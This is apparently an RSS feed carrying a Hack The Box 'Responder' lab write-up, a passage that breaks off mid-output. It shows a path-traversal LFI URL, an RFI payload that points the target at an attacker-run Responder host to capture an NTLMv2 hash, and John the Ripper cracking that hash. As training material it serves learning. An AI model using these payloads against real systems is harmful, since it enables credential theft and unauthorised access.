<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>Pascal's Blog</title><link>https://blog.ppeinecke.de/</link><description>Welcome to my personal blog!</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 13 Sep 2022 19:31:57 +0200</lastBuildDate><atom:link href="https://blog.ppeinecke.de/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB - Starting Point - Responder</title><link>https://blog.ppeinecke.de/posts/htb-starting-point-responder/</link><pubDate>Tue, 13 Sep 2022 19:31:57 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/htb-starting-point-responder/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/responder.jpeg" referrerpolicy="no-referrer">
            </div><h1 id="htb---starting-point-responder---writeup">HTB - Starting Point: Responder - writeup:</h1>
<h2 id="target-ip-address">Target IP Address:</h2>
<p>10.129.17.20</p>
<p><code>export IP=&quot;10.129.17.20&quot;</code></p>
<h1 id="tasks">Tasks</h1>
<h2 id="task1-when-visiting-the-web-service-using-the-ip-address-what-is-the-domain-that-we-are-being-redirected-to">Task1: When visiting the web service using the IP address, what is the domain that we are being redirected to?</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="nv">$IP</span>          
</span></span><span class="line"><span class="cl">&lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;refresh&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;0;url=http://unika.htb/&#34;</span>&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>A: unika.htb</p>
<h2 id="task2-which-scripting-language-is-being-used-on-the-server-to-generate-webpages">Task2: Which scripting language is being used on the server to generate webpages?</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nikto -h http://<span class="nv">$IP</span>      
</span></span><span class="line"><span class="cl">perl: warning: Setting locale failed.
</span></span><span class="line"><span class="cl">perl: warning: Please check that your locale settings:
</span></span><span class="line"><span class="cl">        <span class="nv">LANGUAGE</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="nv">LC_ALL</span> <span class="o">=</span> <span class="o">(</span><span class="nb">unset</span><span class="o">)</span>,
</span></span><span class="line"><span class="cl">        <span class="nv">LANG</span> <span class="o">=</span> <span class="s2">&#34;de_DE.UTF-8&#34;</span>
</span></span><span class="line"><span class="cl">    are supported and installed on your system.
</span></span><span class="line"><span class="cl">perl: warning: Falling back to the standard locale <span class="o">(</span><span class="s2">&#34;C&#34;</span><span class="o">)</span>.
</span></span><span class="line"><span class="cl">- Nikto v2.1.6
</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">+ Target IP:          10.129.128.80
</span></span><span class="line"><span class="cl">+ Target Hostname:    10.129.128.80
</span></span><span class="line"><span class="cl">+ Target Port:        <span class="m">80</span>
</span></span><span class="line"><span class="cl">+ Start Time:         2022-09-13 15:56:59 <span class="o">(</span>GMT2<span class="o">)</span>
</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">+ Server: Apache/2.4.52 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1m PHP/8.1.1
</span></span><span class="line"><span class="cl">+ Retrieved x-powered-by header: PHP/8.1.1
</span></span><span class="line"><span class="cl">+ The anti-clickjacking X-Frame-Options header is not present.
</span></span><span class="line"><span class="cl">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span></span><span class="line"><span class="cl">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>A: PHP</p>
<h2 id="task3-what-is-the-name-of-the-url-parameter-which-is-used-to-load-different-language-versions-of-the-webpage">Task3: What is the name of the URL parameter which is used to load different language versions of the webpage?</h2>
<p>A: page</p>
<h2 id="task4-which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-local-file-include-lfi-vulnerability-frenchhtml-1010146somefile-windowssystem32driversetchosts-minikatzexe">Task4: Which of the following values for the <code>page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: &ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;minikatz.exe&rdquo;</h2>
<p>I was able to exploit LFI like so:</p>
<p><code>http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts</code></p>
<p>A: <a href="http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts" target="_blank" rel="noopener noreffer">http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts</a></p>
<h2 id="task5-which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-remote-file-include-rfi-vulnerability-frenchhtml-1010146somefile-windowssystem32driversetchosts-minikatzexe">Task5: Which of the following values for the <code>page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: &ldquo;french.html&rdquo;, &ldquo;//10.10.14.6/somefile&rdquo;, &ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;, &ldquo;minikatz.exe&rdquo;</h2>
<p>A: //10.10.14.6/somefile</p>
<h2 id="task6-what-does-ntlm-stand-for">Task6: What does NTLM stand for?</h2>
<p>A: New Technology LAN Manager</p>
<h2 id="task7-which-flag-do-we-use-in-the-responder-utility-to-specify-the-network-interface">Task7: Which flag do we use in the Responder utility to specify the network interface?</h2>
<p>A: -I</p>
<h2 id="task8-there-are-several-tools-that-take-a-netntlmv2-challengeresponse-and-try-millions-of-passwords-to-see-if-any-of-them-generate-the-same-response-one-such-tool-is-often-referred-to-as-john-but-the-full-name-is-what">Task8: There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code>john</code>, but the full name is what?.</h2>
<p>A: John the Ripper</p>
<h2 id="task9-what-is-the-password-for-the-administrator-user">Task9: What is the password for the administrator user?</h2>
<p>I was able to run responder and capture hashes by using RFI like mentioned in the bonus section to sideload the php meterpreter file and gaining a shell.</p>
<p>Responder was then able to capture hashes.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo responder -i 10.10.16.156 -I tun0
</span></span><span class="line"><span class="cl">                                         __
</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.1.3.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  To support this project:
</span></span><span class="line"><span class="cl">  Patreon -&gt; https://www.patreon.com/PythonResponder
</span></span><span class="line"><span class="cl">  Paypal  -&gt; https://paypal.me/PythonResponder
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoners:
</span></span><span class="line"><span class="cl">    LLMNR                      <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    NBT-NS                     <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    MDNS                       <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DNS                        <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DHCP                       <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Servers:
</span></span><span class="line"><span class="cl">    HTTP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    HTTPS server               <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    WPAD proxy                 <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Auth proxy                 <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SMB server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Kerberos server            <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SQL server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    FTP server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    IMAP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    POP3 server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SMTP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DNS server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    LDAP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    RDP server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DCE-RPC server             <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    WinRM server               <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> HTTP Options:
</span></span><span class="line"><span class="cl">    Always serving EXE         <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Serving EXE                <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Serving HTML               <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Upstream Proxy             <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoning Options:
</span></span><span class="line"><span class="cl">    Analyze Mode               <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force WPAD auth            <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force Basic Auth           <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force LM downgrade         <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force ESS downgrade        <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Generic Options:
</span></span><span class="line"><span class="cl">    Responder NIC              <span class="o">[</span>tun0<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder IP               <span class="o">[</span>10.10.16.156<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder IPv6             <span class="o">[</span>dead:beef:4::109a<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Challenge <span class="nb">set</span>              <span class="o">[</span>random<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Don<span class="s1">&#39;t Respond To Names     [&#39;</span>ISATAP<span class="err">&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current Session Variables:
</span></span><span class="line"><span class="cl">    Responder Machine Name     <span class="o">[</span>WIN-56MT5U5SZ1U<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder Domain Name      <span class="o">[</span>8EZQ.LOCAL<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder DCE-RPC Port     <span class="o">[</span>49418<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
</span></span></code></pre></td></tr></table>
</div>
</div><p>After pointing my browser to <code>http://unika.htb/index.php?page=\\10.10.16.156\ica\payload.php</code></p>
<p>I can capture a connection and dump NTLMv2 hashes:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 10.129.17.20
</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : RESPONDER<span class="se">\A</span>dministrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : Administrator::RESPONDER:6b65ae6b782b3399:09D597B083E4F1DF38284708ABA04FF5:010100000000000080EBBCED97C7D801950D5D5965F82A570000000002000800380045005A00510001001E00570049004E002D00350036004D00540035005500350053005A003100550004003400570049004E002D00350036004D00540035005500350053005A00310055002E00380045005A0051002E004C004F00430041004C0003001400380045005A0051002E004C004F00430041004C0005001400380045005A0051002E004C004F00430041004C000700080080EBBCED97C7D80106000400020000000800300030000000000000000100000000200000436D29F868457D28FCAC25E68C0588549FE2A0096D761D40A34735311B31BE5E0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100350036000000000000000000
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> RESPONDER<span class="se">\A</span>dministrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> RESPONDER<span class="se">\A</span>dministrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> RESPONDER<span class="se">\A</span>dministrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> RESPONDER<span class="se">\A</span>dministrator
</span></span></code></pre></td></tr></table>
</div>
</div><p>I saved the ntlm2 hash to a file <code>ntlm2_hash</code> and now I will try to crack the hash using John the Ripper!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john ntlm2_hash --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64<span class="o">])</span>
</span></span><span class="line"><span class="cl">Will run <span class="m">8</span> OpenMP threads
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">badminton        <span class="o">(</span>Administrator<span class="o">)</span>     
</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE <span class="o">(</span>2022-09-13 17:55<span class="o">)</span> 11.11g/s 45511p/s 45511c/s 45511C/s 123456..oooooo
</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
</span></span><span class="line"><span class="cl">Session completed.
</span></span></code></pre></td></tr></table>
</div>
</div><p>I am using the password list
<code>rockyou.txt</code> here because it contains the most commonly used passwords.</p>
<p><code>john</code> was immediately able to crack the hash.</p>
<p>The password of the <code>Administrator</code> account is <code>badminton</code></p>
<h2 id="task10-well-use-a-windows-service-ie-running-on-the-box-to-remotely-access-the-responder-machine-using-the-password-we-recovered-what-port-tcp-does-it-listen-on">Task10: We&rsquo;ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</h2>
<p>A: 5985</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -v 10.10.16.156 -p-
</span></span><span class="line"><span class="cl">Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-09-13 18:03 CEST
</span></span><span class="line"><span class="cl">Initiating Ping Scan at 18:03
</span></span><span class="line"><span class="cl">Scanning 10.10.16.156 <span class="o">[</span><span class="m">2</span> ports<span class="o">]</span>
</span></span><span class="line"><span class="cl">Completed Ping Scan at 18:03, 0.00s elapsed <span class="o">(</span><span class="m">1</span> total hosts<span class="o">)</span>
</span></span><span class="line"><span class="cl">Initiating Parallel DNS resolution of <span class="m">1</span> host. at 18:03
</span></span><span class="line"><span class="cl">Completed Parallel DNS resolution of <span class="m">1</span> host. at 18:03, 0.00s elapsed
</span></span><span class="line"><span class="cl">Initiating Connect Scan at 18:03
</span></span><span class="line"><span class="cl">Scanning 10.10.16.156 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
</span></span><span class="line"><span class="cl">Discovered open port 139/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 3389/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 53/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 443/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 445/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 25/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 110/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 80/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 21/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 135/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 587/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 143/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 5986/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 88/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 45107/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 5985/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 389/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 1433/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Completed Connect Scan at 18:03, 1.87s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.16.156
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00012s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65517</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
</span></span><span class="line"><span class="cl">21/tcp    open  ftp
</span></span><span class="line"><span class="cl">25/tcp    open  smtp
</span></span><span class="line"><span class="cl">53/tcp    open  domain
</span></span><span class="line"><span class="cl">80/tcp    open  http
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec
</span></span><span class="line"><span class="cl">110/tcp   open  pop3
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn
</span></span><span class="line"><span class="cl">143/tcp   open  imap
</span></span><span class="line"><span class="cl">389/tcp   open  ldap
</span></span><span class="line"><span class="cl">443/tcp   open  https
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds
</span></span><span class="line"><span class="cl">587/tcp   open  submission
</span></span><span class="line"><span class="cl">1433/tcp  open  ms-sql-s
</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server
</span></span><span class="line"><span class="cl">5985/tcp  open  wsman
</span></span><span class="line"><span class="cl">5986/tcp  open  wsmans
</span></span><span class="line"><span class="cl">45107/tcp open  unknown
</span></span></code></pre></td></tr></table>
</div>
</div><p>On port 5985 is the service <code>wsman</code> running. wsman stands for WS-Management. This is a WinRM service. This provides access to Web Services for Management.</p>
<h2 id="submit-root-flag">Submit root flag</h2>
<p>Let&rsquo;s get the latest versions of Responder and Evil-WinRm!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/lgandx/Responder
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">git clone https://github.com/Hackplayers/evil-winrm
</span></span></code></pre></td></tr></table>
</div>
</div><p>Next run Responder so it can listen for requests.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> Responder
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sudo python3 Responder.py -I tun0
</span></span><span class="line"><span class="cl">                                         __
</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.1.3.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  To support this project:
</span></span><span class="line"><span class="cl">  Patreon -&gt; https://www.patreon.com/PythonResponder
</span></span><span class="line"><span class="cl">  Paypal  -&gt; https://paypal.me/PythonResponder
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoners:
